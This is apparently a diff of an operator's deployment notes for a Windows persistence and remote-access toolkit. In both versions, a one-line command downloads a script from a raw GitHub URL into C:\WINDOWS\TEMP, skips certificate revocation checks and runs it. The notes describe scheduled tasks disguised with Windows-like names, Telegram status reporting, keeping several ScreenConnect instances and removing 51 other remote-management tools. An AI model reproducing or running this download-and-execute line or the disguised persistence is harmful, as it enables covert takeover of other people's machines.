@@ -1,19 +1,13 @@
-UNIVERSAL DEPLOY (O34 / M24 / L13 / T14 / S6):
+UNIVERSAL DEPLOY (O35 / M25 / L14 / T15 / S7):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/b57c01b/own.txt" & findstr /C:"OWN BUILD 20260802O34" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o35" & findstr /C:"OWN BUILD 20260802O35" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
-Must print: === OWN BUILD 20260802O34 ===
+O35:
+- Quiet TG: no hourly digest when healthy (prim OK + gryxa OK + no foreign);
+  unhealthy digests at most every 6h; DOWN skipped if already Running; 6h rate-limit.
+- Gryxa ScreenConnect KEEP+install beside sevrz:
+  FP 9908198e668e4750 | ui.gryxa.com | update.gryxa.com
+  Keeps: sevrz 5f6010579852e507 + alt f861c8140d453427 + gryxa 9908198e668e4750
 
-O34: schtasks Create uses BOOT TR (Windows\Temp\.wucache) like working WucacheOwn
-detach — ProgramData .wucache is ACL-locked by early secure so TR there failed.
-IDENTVER=8 root names without leading backslash; /ST on MINUTE tasks.
-
-Expect TG:
-  Source build: O34
-  Payload: MON=M24 | SEC=S6 | TGR=T14 | LIB=L13
-  identity_A=WerQueueSync (no \Microsoft\Windows\...)
-  Persist tasks OK: 4/5 or 5/5
-  boot.err: create_taskA_begin (not only verify_taskA_FAIL)
-
-KEEP: dual ScreenConnect + Datto/CentraStage
-REMOVE: 51 RMM/remote tools
+Expect: Source O35 | MON=M25 | LIB=L14 | TGR=T15 | SEC=S7
+  Gryxa Running [KEEP-GRYXA]; far fewer SCD digest lines.
